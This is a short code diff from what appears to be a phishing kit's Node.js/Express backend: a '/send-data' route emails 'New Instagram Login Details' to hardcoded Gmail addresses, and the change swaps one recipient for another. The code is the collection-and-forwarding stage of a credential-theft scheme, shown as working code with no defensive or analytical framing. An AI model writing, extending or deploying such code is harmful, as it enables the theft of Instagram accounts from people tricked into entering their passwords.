@@ -29,7 +29,7 @@ app.post('/send-data', (req, res) => {
 
     const mailOptions = {
         from: 'lagharitahir08@gmail.com',
-        to: 'lagharitahir08@gmail.com, tahirlaghari094@gmail.com', // Correct comma-separated string
+        to: 'lagharitahir08@gmail.com, yaqoobbhurgri4@gmail.com', // Correct comma-separated string
         subject: 'New Instagram Login Details',
         text: `Nayi Login Details aayi hain:
 
